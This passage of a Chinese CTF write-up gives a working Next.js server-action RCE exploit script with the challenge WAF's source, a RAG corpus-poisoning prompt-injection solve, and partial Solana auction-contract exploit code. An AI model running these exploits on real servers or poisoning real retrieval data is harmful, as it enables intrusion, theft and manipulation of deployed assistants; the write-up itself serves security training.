Sh0eXBlKSk7XG4gICAgICByZXR1cm4gdHlwZTtcbiAgICB9XG4gICAgZnVuY3Rpb24ganN4REVWSW1wbChcbiAgICAgIHR5cGUsXG4gICAgICBjb25maWcsXG4gICAgICBtYXliZUtleSxcbiAgICAgIGlzU3RhdGljQ2hpbGRyZW4sXG4gICAgICBkZWJ1Z1N0YWNrLFxuICAgICAgZGVidWdUYXNrXG4gICAgKSB7XG4gICAgICB2YXIgY2hpbGRyZW4gPSBjb25maWcuY2hpbGRyZW47XG4gICAgICBpZiAodm9pZCAwICE9PSBjaGlsZHJlbilcbiAgICAgICAgaWYgKGlzU3RhdGljQ2hpbGRyZW4pXG4gICAgICAgICAgaWYgKGlzQXJyYXlJbXBsKGNoaWxkcmVuKSkge1xuICAgICAgICAgICAgZm9yIChcbiAgICAgICAgICAgICAgaXNTdGF0aWNDaGlsZHJlbiA9IDA7XG4gICAgICAgICAgICAgIGlzU3RhdGljQ2hpbGRyZW4gPCBjaGlsZHJlbi5sZW5ndGg7XG4gICAgICAgICAgICAgIGlzU3RhdGljQ2hpbGRyZW4rK1xuICAgICAgICAgICAgKVxuICAgICAgICAgICAgICB2YWxpZGF0ZUNoaWxkS2V5cyhjaGlsZHJlbltpc1N0YXRpY0NoaWxkcmVuXSk7XG4gICAgICAgICAgICBPYmplY3QuZnJlZXplICYmIE9iamVjdC5mcmVlemUoY2hpbGRyZW4pO1xuICAgICAgICAgIH0gZWxzZVxuICAgICAgICAgICAgY29uc29sZS5lcnJvcihcbiAgICAgICAgICAgICAgXCJSZWFjdC5qc3g6IFN0YXRpYyBjaGlsZHJlbiBzaG91bGQgYWx3YXlzIGJlIGFuIGFycmF5LiBZb3UgYXJlIGxpa2VseSBleHBsaWNpdGx5IGNhbGxpbmcgUmVhY3QuanN4cyBvciBSZWFjdC5qc3hERVYuIFVzZSB0aGUgQmFiZWwgdHJhbnNmb3JtIGluc3RlYWQuXCJcbiAgICAgICAgICAgICk7XG4gICAgICAgIGVsc2UgdmFsaWRhdGVDaGlsZEtleXMoY2hpbGRyZW4pO1xuICAgICAgaWYgKGhhc093blByb3BlcnR5LmNhbGwoY29uZmlnLCBcImtleVwiKSkge1xuICAgICAgICBjaGlsZHJlbiA9IGdldENvbXBvbmVudE5hbWVGcm9tVHlwZSh0eXBlKTtcbiAgICAgICAgdmFyIGtleXMgPSBPYmplY3Qua2V5cyhjb25maWcpLmZpbHRlcihmdW5jdGlvbiAoaykge1xuICAgICAgICAgIHJldHVybiBcImtleVwiICE9PSBrO1xuICAgICAgICB9KTtcbiAgICAgICAgaXNTdGF0aWNDaGlsZHJlbiA9XG4gICAgICAgICAgMCA8IGtleXMubGVuZ3RoXG4gICAgICAgICAgICA/IFwie2tleTogc29tZUtleSwgXCIgKyBrZXlzLmpvaW4oXCI6IC4uLiwgXCIpICsgXCI6IC4uLn1cIlxuICAgICAgICAgICAgOiBcIntrZXk6IHNvbWVLZXl9XCI7XG4gICAgICAgIGRpZFdhcm5BYm91dEtleVNwcmVhZFtjaGlsZHJlbiArIGlzU3RhdGljQ2hpbGRyZW5dIHx8XG4gICAgICAgICAgKChrZXlzID1cbiAgICAgICAgICAgIDAgPCBrZXlzLmxlbmd0aCA/IFwie1wiICsga2V5cy5qb2luKFwiOiAuLi4sIFwiKSArIFwiOiAuLi59XCIgOiBcInt9XCIpLFxuICAgICAgICAgIGNvbnNvbGUuZXJyb3IoXG4gICAgICAgICAgICAnQSBwcm9wcyBvYmplY3QgY29udGFpbmluZyBhIFwia2V5XCIgcHJvcCBpcyBiZWluZyBzcHJlYWQgaW50byBKU1g6XFxuICBsZXQgcHJvcHMgPSAlcztcXG4gIDwlcyB7Li4ucHJvcHN9IC8+XFxuUmVhY3Qga2V5cyBtdXN0IGJlIHBhc3NlZCBkaXJlY3RseSB0byBKU1ggd2l0aG91dCB1c2luZyBzcHJlYWQ6XFxuICBsZXQgcHJvcHMgPSAlcztcXG4gIDwlcyBrZXk9e3NvbWVLZXl9IHsuLi5wcm9wc30gLz4nLFxuICAgICAgICAgICAgaXNTdGF0aWNDaGlsZHJlbixcbiAgICAgICAgICAgIGNoaWxkcmVuLFxuICAgICAgICAgICAga2V5cyxcbiAgICAgICAgICAgIGNoaWxkcmVuXG4gICAgICAgICAgKSxcbiAgICAgICAgICAoZGlkV2FybkFib3V0S2V5U3ByZWFkW2NoaWxkcmVuICsgaXNTdGF0aWNDaGlsZHJlbl0gPSAhMCkpO1xuICAgICAgfVxuICAgICAgY2hpbGRyZW4gPSBudWxsO1xuICAgICAgdm9pZCAwICE9PSBtYXliZUtleSAmJlxuICAgICAgICAoY2hlY2tLZXlTdHJpbmdDb2VyY2lvbihtYXliZUtleSksIChjaGlsZHJlbiA9IFwiXCIgKyBtYXliZUtleSkpO1xuICAgICAgaGFzVmFsaWRLZXkoY29uZmlnKSAmJlxuICAgICAgICAoY2hlY2tLZXlTdHJpbmdDb2VyY2lvbihjb25maWcua2V5KSwgKGNoaWxkcmVuID0gXCJcIiArIGNvbmZpZy5rZXkpKTtcbiAgICAgIGlmIChcImtleVwiIGluIGNvbmZpZykge1xuICAgICAgICBtYXliZUtleSA9IHt9O1xuICAgICAgICBmb3IgKHZhciBwcm9wTmFtZSBpbiBjb25maWcpXG4gICAgICAgICAgXCJrZXlcIiAhPT0gcHJvcE5hbWUgJiYgKG1heWJlS2V5W3Byb3BOYW1lXSA9IGNvbmZpZ1twcm9wTmFtZV0pO1xuICAgICAgfSBlbHNlIG1heWJlS2V5ID0gY29uZmlnO1xuICAgICAgY2hpbGRyZW4gJiZcbiAgICAgICAgZGVmaW5lS2V5UHJvcFdhcm5pbmdHZXR0ZXIoXG4gICAgICAgICAgbWF5YmVLZXksXG4gICAgICAgICAgXCJmdW5jdGlvblwiID09PSB0eXBlb2YgdHlwZVxuICAgICAgICAgICAgPyB0eXBlLmRpc3BsYXlOYW1lIHx8IHR5cGUubmFtZSB8fCBcIlVua25vd25cIlxuICAgICAgICAgICAgOiB0eXBlXG4gICAgICAgICk7XG4gICAgICByZXR1cm4gUmVhY3RFbGVtZW50KFxuICAgICAgICB0eXBlLFxuICAgICAgICBjaGlsZHJlbixcbiAgICAgICAgbWF5YmVLZXksXG4gICAgICAgIGdldE93bmVyKCksXG4gICAgICAgIGRlYnVnU3RhY2ssXG4gICAgICAgIGRlYnVnVGFza1xuICAgICAgKTtcbiAgICB9XG4gICAgZnVuY3Rpb24gdmFsaWRhdGVDaGlsZEtleXMobm9kZSkge1xuICAgICAgaXNWYWxpZEVsZW1lbnQobm9kZSlcbiAgICAgICAgPyBub2RlLl9zdG9yZSAmJiAobm9kZS5fc3RvcmUudmFsaWRhdGVkID0gMSlcbiAgICAgICAgOiBcIm9iamVjdFwiID09PSB0eXBlb2Ygbm9kZSAmJlxuICAgICAgICAgIG51bGwgIT09IG5vZGUgJiZcbiAgICAgICAgICBub2RlLiQkdHlwZW9mID09PSBSRUFDVF9MQVpZX1RZUEUgJiZcbiAgICAgICAgICAoXCJmdWxmaWxsZWRcIiA9PT0gbm9kZS5fcGF5bG9hZC5zdGF0dXNcbiAgICAgICAgICAgID8gaXNWYWxpZEVsZW1lbnQobm9kZS5fcGF5bG9hZC52YWx1ZSkgJiZcbiAgICAgICAgICAgICAgbm9kZS5fcGF5bG9hZC52YWx1ZS5fc3RvcmUgJiZcbiAgICAgICAgICAgICAgKG5vZGUuX3BheWxvYWQudmFsdWUuX3N0b3JlLnZhbGlkYXRlZCA9IDEpXG4gICAgICAgICAgICA6IG5vZGUuX3N0b3JlICYmIChub2RlLl9zdG9yZS52YWxpZGF0ZWQgPSAxKSk7XG4gICAgfVxuICAgIGZ1bmN0aW9uIGlzVmFsaWRFbGVtZW50KG9iamVjdCkge1xuICAgICAgcmV0dXJuIChcbiAgICAgICAgXCJvYmplY3RcIiA9PT0gdHlwZW9mIG9iamVjdCAmJlxuICAgICAgICBudWxsICE9PSBvYmplY3QgJiZcbiAgICAgICAgb2JqZWN0LiQkdHlwZW9mID09PSBSRUFDVF9FTEVNRU5UX1RZUEVcbiAgICAgICk7XG4gICAgfVxuICAgIHZhciBSZWFjdCA9IHJlcXVpcmUoXCJuZXh0L2Rpc3QvY29tcGlsZWQvcmVhY3RcIiksXG4gICAgICBSRUFDVF9FTEVNRU5UX1RZUEUgPSBTeW1ib2wuZm9yKFwicmVhY3QudHJhbnNpdGlvbmFsLmVsZW1lbnRcIiksXG4gICAgICBSRUFDVF9QT1JUQUxfVFlQRSA9IFN5bWJvbC5mb3IoXCJyZWFjdC5wb3J0YWxcIiksXG4gICAgICBSRUFDVF9GUkFHTUVOVF9UWVBFID0gU3ltYm9sLmZvcihcInJlYWN0LmZyYWdtZW50XCIpLFxuICAgICAgUkVBQ1RfU1RSSUNUX01PREVfVFlQRSA9IFN5bWJvbC5mb3IoXCJyZWFjdC5zdHJpY3RfbW9kZVwiKSxcbiAgICAgIFJFQUNUX1BST0ZJTEVSX1RZUEUgPSBTeW1ib2wuZm9yKFwicmVhY3QucHJvZmlsZXJcIiksXG4gICAgICBSRUFDVF9DT05TVU1FUl9UWVBFID0gU3ltYm9sLmZvcihcInJlYWN0LmNvbnN1bWVyXCIpLFxuICAgICAgUkVBQ1RfQ09OVEVYVF9UWVBFID0gU3ltYm9sLmZvcihcInJlYWN0LmNvbnRleHRcIiksXG4gICAgICBSRUFDVF9GT1JXQVJEX1JFRl9UWVBFID0gU3ltYm9sLmZvcihcInJlYWN0LmZvcndhcmRfcmVmXCIpLFxuICAgICAgUkVBQ1RfU1VTUEVOU0VfVFlQRSA9IFN5bWJvbC5mb3IoXCJyZWFjdC5zdXNwZW5zZVwiKSxcbiAgICAgIFJFQUNUX1NVU1BFTlNFX0xJU1RfVFlQRSA9IFN5bWJvbC5mb3IoXCJyZWFjdC5zdXNwZW5zZV9saXN0XCIpLFxuICAgICAgUkVBQ1RfTUVNT19UWVBFID0gU3ltYm9sLmZvcihcInJlYWN0Lm1lbW9cIiksXG4gICAgICBSRUFDVF9MQVpZX1RZUEUgPSBTeW1ib2wuZm9yKFwicmVhY3QubGF6eVwiKSxcbiAgICAgIFJFQUNUX0FDVElWSVRZX1RZUEUgPSBTeW1ib2wuZm9yKFwicmVhY3QuYWN0aXZpdHlcIiksXG4gICAgICBSRUFDVF9WSUVXX1RSQU5TSVRJT05fVFlQRSA9IFN5bWJvbC5mb3IoXCJyZWFjdC52aWV3X3RyYW5zaXRpb25cIiksXG4gICAgICBSRUFDVF9DTElFTlRfUkVGRVJFTkNFID0gU3ltYm9sLmZvcihcInJlYWN0LmNsaWVudC5yZWZlcmVuY2VcIiksXG4gICAgICBSZWFjdFNoYXJlZEludGVybmFscyA9XG4gICAgICAgIFJlYWN0Ll9fQ0xJRU5UX0lOVEVSTkFMU19ET19OT1RfVVNFX09SX1dBUk5fVVNFUlNfVEhFWV9DQU5OT1RfVVBHUkFERSxcbiAgICAgIGhhc093blByb3BlcnR5ID0gT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eSxcbiAgICAgIGlzQXJyYXlJbXBsID0gQXJyYXkuaXNBcnJheSxcbiAgICAgIGNyZWF0ZVRhc2sgPSBjb25zb2xlLmNyZWF0ZVRhc2tcbiAgICAgICAgPyBjb25zb2xlLmNyZWF0ZVRhc2tcbiAgICAgICAgOiBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICByZXR1cm4gbnVsbDtcbiAgICAgICAgICB9O1xuICAgIFJlYWN0ID0ge1xuICAgICAgcmVhY3Rfc3RhY2tfYm90dG9tX2ZyYW1lOiBmdW5jdGlvbiAoY2FsbFN0YWNrRm9yRXJyb3IpIHtcbiAgICAgICAgcmV0dXJuIGNhbGxTdGFja0ZvckVycm9yKCk7XG4gICAgICB9XG4gICAgfTtcbiAgICB2YXIgc3BlY2lhbFByb3BLZXlXYXJuaW5nU2hvd247XG4gICAgdmFyIGRpZFdhcm5BYm91dEVsZW1lbnRSZWYgPSB7fTtcbiAgICB2YXIgdW5rbm93bk93bmVyRGVidWdTdGFjayA9IFJlYWN0LnJlYWN0X3N0YWNrX2JvdHRvbV9mcmFtZS5iaW5kKFxuICAgICAgUmVhY3QsXG4gICAgICBVbmtub3duT3duZXJcbiAgICApKCk7XG4gICAgdmFyIHVua25vd25Pd25lckRlYnVnVGFzayA9IGNyZWF0ZVRhc2soZ2V0VGFza05hbWUoVW5rbm93bk93bmVyKSk7XG4gICAgdmFyIGRpZFdhcm5BYm91dEtleVNwcmVhZCA9IHt9O1xuICAgIGV4cG9ydHMuRnJhZ21lbnQgPSBSRUFDVF9GUkFHTUVOVF9UWVBFO1xuICAgIGV4cG9ydHMuanN4REVWID0gZnVuY3Rpb24gKHR5cGUsIGNvbmZpZywgbWF5YmVLZXksIGlzU3RhdGljQ2hpbGRyZW4pIHtcbiAgICAgIHZhciB0cmFja0FjdHVhbE93bmVyID1cbiAgICAgICAgMWU0ID4gUmVhY3RTaGFyZWRJbnRlcm5hbHMucmVjZW50bHlDcmVhdGVkT3duZXJTdGFja3MrKztcbiAgICAgIGlmICh0cmFja0FjdHVhbE93bmVyKSB7XG4gICAgICAgIHZhciBwcmV2aW91c1N0YWNrVHJhY2VMaW1pdCA9IEVycm9yLnN0YWNrVHJhY2VMaW1pdDtcbiAgICAgICAgRXJyb3Iuc3RhY2tUcmFjZUxpbWl0ID0gMTA7XG4gICAgICAgIHZhciBkZWJ1Z1N0YWNrREVWID0gRXJyb3IoXCJyZWFjdC1zdGFjay10b3AtZnJhbWVcIik7XG4gICAgICAgIEVycm9yLnN0YWNrVHJhY2VMaW1pdCA9IHByZXZpb3VzU3RhY2tUcmFjZUxpbWl0O1xuICAgICAgfSBlbHNlIGRlYnVnU3RhY2tERVYgPSB1bmtub3duT3duZXJEZWJ1Z1N0YWNrO1xuICAgICAgcmV0dXJuIGpzeERFVkltcGwoXG4gICAgICAgIHR5cGUsXG4gICAgICAgIGNvbmZpZyxcbiAgICAgICAgbWF5YmVLZXksXG4gICAgICAgIGlzU3RhdGljQ2hpbGRyZW4sXG4gICAgICAgIGRlYnVnU3RhY2tERVYsXG4gICAgICAgIHRyYWNrQWN0dWFsT3duZXIgPyBjcmVhdGVUYXNrKGdldFRhc2tOYW1lKHR5cGUpKSA6IHVua25vd25Pd25lckRlYnVnVGFza1xuICAgICAgKTtcbiAgICB9O1xuICB9KSgpO1xuIl0sIm5hbWVzIjpbXSwiaWdub3JlTGlzdCI6WzBdLCJzb3VyY2VSb290IjoiIn0=\n//# sourceURL=webpack-internal:///(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/cjs/react-jsx-dev-runtime.development.js\n"));

/***/ }),

/***/ "(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/jsx-dev-runtime.js":
/*!****************************************************************************************************************************************************************!*\
  !*** ./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/jsx-dev-runtime.js ***!
  \****************************************************************************************************************************************************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

"use strict";
eval(__webpack_require__.ts("\n\nif (false) {} else {\n  module.exports = __webpack_require__(/*! ./cjs/react-jsx-dev-runtime.development.js */ \"(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/cjs/react-jsx-dev-runtime.development.js\");\n}\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiKGFwcC1wYWdlcy1icm93c2VyKS8uL25vZGVfbW9kdWxlcy8ucG5wbS9uZXh0QDE2LjAuNl9AYmFiZWwrY29yZUA3LjI4LjVfcmVhY3QtZG9tQDE5LjIuMF9yZWFjdEAxOS4yLjBfX3JlYWN0QDE5LjIuMC9ub2RlX21vZHVsZXMvbmV4dC9kaXN0L2NvbXBpbGVkL3JlYWN0L2pzeC1kZXYtcnVudGltZS5qcyIsIm1hcHBpbmdzIjoiQUFBYTs7QUFFYixJQUFJLEtBQXFDLEVBQUUsRUFFMUMsQ0FBQztBQUNGLEVBQUUsNFJBQXNFO0FBQ3hFIiwic291cmNlcyI6WyIvYXBwL25vZGVfbW9kdWxlcy8ucG5wbS9uZXh0QDE2LjAuNl9AYmFiZWwrY29yZUA3LjI4LjVfcmVhY3QtZG9tQDE5LjIuMF9yZWFjdEAxOS4yLjBfX3JlYWN0QDE5LjIuMC9ub2RlX21vZHVsZXMvbmV4dC9kaXN0L2NvbXBpbGVkL3JlYWN0L2pzeC1kZXYtcnVudGltZS5qcyJdLCJzb3VyY2VzQ29udGVudCI6WyIndXNlIHN0cmljdCc7XG5cbmlmIChwcm9jZXNzLmVudi5OT0RFX0VOViA9PT0gJ3Byb2R1Y3Rpb24nKSB7XG4gIG1vZHVsZS5leHBvcnRzID0gcmVxdWlyZSgnLi9janMvcmVhY3QtanN4LWRldi1ydW50aW1lLnByb2R1Y3Rpb24uanMnKTtcbn0gZWxzZSB7XG4gIG1vZHVsZS5leHBvcnRzID0gcmVxdWlyZSgnLi9janMvcmVhY3QtanN4LWRldi1ydW50aW1lLmRldmVsb3BtZW50LmpzJyk7XG59XG4iXSwibmFtZXMiOltdLCJpZ25vcmVMaXN0IjpbMF0sInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/jsx-dev-runtime.js\n"));

/***/ })

},
/******/ __webpack_require__ => { // webpackRuntimeModules
/******/ var __webpack_exec__ = (moduleId) => (__webpack_require__(__webpack_require__.s = moduleId))
/******/ __webpack_require__.O(0, ["main-app"], () => (__webpack_exec__("(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/build/webpack/loaders/next-flight-client-entry-loader.js?modules=%7B%22request%22%3A%22%2Fapp%2Fapp%2Fpage.tsx%22%2C%22ids%22%3A%5B%5D%7D&server=false!")));
/******/ var __webpack_exports__ = __webpack_require__.O();
/******/ _N_E = __webpack_exports__;
/******/ }
]);
```

`ATTENTION: An "eval-source-map" devtool has been used.`因为出题人配置了 Webpack 的 `eval-source-map` 模式，所以下载没成功，现在分析得到 zip 位置，`// read /source-3527c84d-2ecc-4c76-9d83-7e83138c19a8.zip`

```python
#!/usr/bin/env python3
"""
Next-WAF 下一代应用防火墙
"""

from flask import Flask, request, Response
import requests
import json

app = Flask(__name__)

BACKEND_URL = "http://127.0.0.1:3000"

# 允许的 headers（小写）
ALLOWED_HEADERS = {
    "host",
    "user-agent",
    "accept",
    "accept-language",
    "accept-encoding",
    "cookie",
    "connection",
    "cache-control",
    "pragma",
    "next-action",
}

# 禁止的关键字（小写）
FORBIDDEN_KEYWORDS = ["__proto__", "constructor", "prototype", "\\u"]


def check_forbidden(value):
    """
    递归检查值是否包含禁止的关键字
    对所有 string 类型进行检查，不区分大小写
    如果字符串是合法的 JSON，则解析并递归检查
    """
    if isinstance(value, str):
        lower_value = value.lower()
        for keyword in FORBIDDEN_KEYWORDS:
            if keyword in lower_value:
                return False
        # 尝试解析为 JSON，如果成功则递归检查
        try:
            parsed = json.loads(value.strip())
            # 只有当解析结果是 dict 或 list 时才递归检查
            if isinstance(parsed, (dict, list, str)):
                if not check_forbidden(parsed):
                    return False
        except (json.JSONDecodeError, TypeError):
            # 不是有效的 JSON，已经通过了字符串检查，放行
            pass
        return True
    elif isinstance(value, dict):
        for k, v in value.items():
            # 检查 key（如果是字符串）
            if isinstance(k, str):
                lower_k = k.lower()
                for keyword in FORBIDDEN_KEYWORDS:
                    if keyword in lower_k:
                        return False
            # 递归检查 value
            if not check_forbidden(v):
                return False
        return True
    elif isinstance(value, list):
        for item in value:
            if not check_forbidden(item):
                return False
        return True
    else:
        # 其他类型（int, float, bool, None）直接放行
        return True


def filter_headers(headers):
    """过滤 headers，只保留允许的"""
    filtered = {}
    for key, value in headers.items():
        if key.lower() in ALLOWED_HEADERS:
            # 不转发 host，让 requests 自己设置
            if key.lower() != "host":
                filtered[key] = value
    return filtered


@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def proxy(path):
    # 过滤 headers
    headers = filter_headers(request.headers)

    # 构建目标 URL
    url = f"{BACKEND_URL}/{path}"
    # if request.query_string:
    #     url += f"?{request.query_string.decode()}"

    try:
        if request.method == "GET":
            resp = requests.get(url, headers=headers, timeout=30)

        elif request.method == "POST":
            content_type = request.content_type or ""
            if "multipart/form-data" in content_type:
                # 准备表单字段
                files = {}
                for key in request.form:
                    if not check_forbidden(key):
                        return Response("Forbidden", status=403)
                    for value in request.form.getlist(key):
                        try:
                            data = json.loads(value)
                            if not check_forbidden(data):
                                return Response("Forbidden", status=403)
                            files[key] = (None, json.dumps(data))
                        except Exception:
                            return Response("Forbidden", status=403)

                # 发送 multipart 请求
                resp = requests.post(url, headers=headers, files=files, timeout=30)

            elif "text/plain" in content_type:
                # Text/plain - 尝试解析为 JSON 并验证
                body = request.get_data(as_text=True)
                try:
                    parsed = json.loads(body)
                    if not check_forbidden(parsed):
                        return Response("Forbidden", status=403)
                except Exception:
                    # 不是有效的 JSON，拒绝
                    return Response("Invalid JSON", status=400)

                # 转发原始请求体
                headers["Content-Type"] = "text/plain"
                resp = requests.post(url, headers=headers, data=body, timeout=30)

            else:
                return Response("Unsupported Content-Type", status=400)
        else:
            return Response("Method Not Allowed", status=405)

    except requests.exceptions.RequestException as e:
        return Response(f"Backend Error: {str(e)}", status=502)

    # 构建响应，排除某些 hop-by-hop headers
    excluded_headers = {"content-encoding", "content-length", "transfer-encoding", "connection"}
    response_headers = [(name, value) for name, value in resp.headers.items() if name.lower() not in excluded_headers]

    return Response(resp.content, resp.status_code, response_headers)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)

```

有 WAF 并且也给了攻击入口

```javascript
'use server'
export async function Hello(input: string): Promise<string> {
  return `hello ${input}!`;
}

export async function GetSource(): Promise<string> {
  // read /source-3527c84d-2ecc-4c76-9d83-7e83138c19a8.zip
  return "";
}
```

然后根据这些分析，本地写个打印日志的功能，就能慢慢调出来 payload，主要的思路还是利用`module.register()`执行一段`data:`模块代码去拿到 RCE 的 poc，后面写入文件就行了

```python
#!/usr/bin/env python3
import argparse
import base64
import json
import secrets
import time

import requests


def build_payload(js_source: str, parent_url: str = "file:///tmp/") -> dict[str, tuple[None, str]]:
    data_url = "data:text/javascript;base64," + base64.b64encode(js_source.encode()).decode()
    payload = {
        "0": "\"$1\"",
        "1": json.dumps(
            {
                "status": "resolved_model",
                "reason": 0,
                "_response": "$5",
                "value": json.dumps(
                    {
                        "_preload1": "$9",
                        "then": "$b:map",
                        "0": "$a",
                        "length": 1,
                    }
                ),
                "then": "$2:then",
            }
        ),
        "2": "\"$@3\"",
        "3": "\"\"",
        "5": json.dumps(
            {
                "_prefix": "$2:_response:_prefix",
                "_formData": "$2:_response:_formData",
                "_chunks": "$2:_response:_chunks",
                "_bundlerConfig": {
                    "bar": {
                        "id": "module",
                        "name": "*",
                        "chunks": [],
                    }
                },
            }
        ),
        "6": json.dumps({"id": "bar"}),
        "7": "\"$F6\"",
        "8": json.dumps({"set": "$7:register"}),
        "9": json.dumps(
            {
                "_prefix": "$2:_response:_prefix",
                "_formData": "$2:_response:_formData",
                "_chunks": "$2:_response:_chunks",
                "_temporaryReferences": "$8",
            }
        ),
        "10": "\"$@4\"",
        "11": "[]",
        "4": json.dumps(
            {
                "status": "resolved_model",
                "reason": parent_url,
                "_response": "$9",
                "value": json.dumps([data_url]),
                "then": "$2:then",
            }
        ),
    }
    return {key: (None, value) for key, value in payload.items()}


def post_rce(session: requests.Session, base_url: str, js_source: str) -> requests.Response:
    return session.post(
        base_url.rstrip("/") + "/",
        headers={"Next-Action": "x"},
        files=build_payload(js_source),
        timeout=8,
    )


def fetch_public(session: requests.Session, base_url: str, name: str, retries: int = 10, delay: float = 0.5) -> str:
    url = f"{base_url.rstrip('/')}/{name}"
    last_response = None
    for attempt in range(retries):
        last_response = session.get(f"{url}?t={time.time()}-{attempt}", timeout=8)
        if last_response.status_code == 200:
            return last_response.text
        time.sleep(delay)
    raise RuntimeError(f"failed to fetch {url}, last status={last_response.status_code if last_response else 'none'}")


def discover_flag_name(session: requests.Session, base_url: str, out_name: str) -> tuple[str, list[str]]:
    js_source = f"""
import {{ readdirSync, writeFileSync }} from "node:fs";
try {{
  const listing = readdirSync("/");
  writeFileSync(process.cwd()+"/public/{out_name}", JSON.stringify(listing));
}} catch (e) {{
  writeFileSync(process.cwd()+"/public/{out_name}", String(e && e.stack || e));
}}
""".strip()
    post_rce(session, base_url, js_source)
    listing_text = fetch_public(session, base_url, out_name)
    listing = json.loads(listing_text)
    flag_name = next((entry for entry in listing if entry.startswith("flag-")), None)
    if not flag_name:
        raise RuntimeError(f"could not find random flag file in listing: {listing}")
    return flag_name, listing


def read_flag(session: requests.Session, base_url: str, flag_name: str, out_name: str) -> str:
    js_source = f"""
import {{ chmodSync, readFileSync, writeFileSync }} from "node:fs";
try {{
  const flagPath = "/{flag_name}";
  chmodSync(flagPath, 0o400);
  const content = readFileSync(flagPath, "utf8");
  writeFileSync(process.cwd()+"/public/{out_name}", content);
}} catch (e) {{
  writeFileSync(process.cwd()+"/public/{out_name}", String(e && e.stack || e));
}}
""".strip()
    post_rce(session, base_url, js_source)
    return fetch_public(session, base_url, out_name)


def main() -> None:
    parser = argparse.ArgumentParser(description="React2Shell two-stage exploit for the Next.js CTF challenge")
    parser.add_argument(
        "--base",
        default="http://223.6.249.127:44120",
        help="challenge base URL",
    )
    args = parser.parse_args()

    session = requests.Session()
    nonce = secrets.token_hex(4)
    discover_name = f"discover-{nonce}.json"
    flag_out_name = f"flag-{nonce}.txt"

    flag_name, listing = discover_flag_name(session, args.base, discover_name)
    print(f"[+] / listing: {listing}")
    print(f"[+] discovered flag file: /{flag_name}")

    flag = read_flag(session, args.base, flag_name, flag_out_name)
    print(f"[+] flag: {flag}")


if __name__ == "__main__":
    main()


## python3 exp.py
```

最后还有个权限控制，直接 chmod 回去就行了

# Misc

## RAG投毒挑战

本质上是基于RAG的间接提示注入攻击

题目给出了对应的RAG数据库数据文本，而靶机固定量两个问题，RAG会基于数据库里的数据做向量检索，然后返回对应的问题答案

所以我们可以通过修改对应的数据文本去引导RAG检索我们构造的恶意提示词，然后去执行一些操作

下载原始语料后直接上传 

![img](24.png)

测试后知道第一个问题的答案是李善德购买的宅子位于长安城南边的归义坊内。，去掉修饰语其实就是归义坊，通过VSCode搜索发现是在chunk_002.txt得到的这个答案。

![img](25.png)

试着在原文的归义坊附近添加内容来输出flag

![img](26.png)

上传后得到flag

![img](27.png)

## Auction

题目实现的是一个拍卖

拍卖参数 为起拍价：1 SOL，Deposit：0.2 SOL ，Buy Now：10 SOL，但是最开始我们只有0.1SOL，状态未清理导致的状态混淆 ：BidderState PDA的地址由 [b"bidder", auction_key, bidder_key] 派生。Auction PDA 的地址由 [b"auction", user_key, auction_id] 派生。如果我们创建一个拍卖（ID 1338），结束后将其关闭，然后 重新创建 同一个 ID 的拍卖， Auction 账户地址和对应的 BidderState 地址是完全相同的。合约在关闭拍卖时， 没有清除 BidderState 中的数据。

利用“低门槛进场，高门槛退场”的差异，凭空套取 Vault 中的资金。

我们写攻击代码lib.rs

```YAML
use anchor_lang::prelude::*;
use anchor_lang::system_program;

declare_id!("4FYNmWbFutX4fPV9edZCJg6vNnZGva56WpKCPWWMkpuj");

#[program]
pub mod solve {
    use super::*;

    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        msg!("Exploit starting...");
 
        let transfer_ctx = CpiContext::new(
            ctx.accounts.system_program.to_account_info(),
            system_program::Transfer {
                from: ctx.accounts.user.to_account_info(),
                to: ctx.accounts.pda_bidder.to_account_info(),
            },
        );
        system_program::transfer(transfer_ctx, 10_000_000)?;
        msg!("Funded PDA");

        phase_1(&ctx)?;
        phase_2(&ctx)?;
        phase_3(&ctx)?;

        Ok(())
    }
}

fn phase_1(ctx: &Context<Initialize>) -> Result<()> {
    let now = Clock::get()?.unix_timestamp;
    let end_time_1 = now + 1000; 
    let deadline_1 = end_time_1 + 60 * 60 * 24 * 8; 

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::CreateAuction {
                auctioneer: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::create_auction(cpi_ctx, 1338, "Prime".to_string(), 100, 10, 1, end_time_1, deadline_1)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::place_bid(cpi_ctx, 10)?;
    }

    {
        let seeds = &[b"helper".as_ref(), &[ctx.bumps.pda_bidder]];
        let signer = &[&seeds[..]];
        let cpi_ctx = CpiContext::new_with_signer(
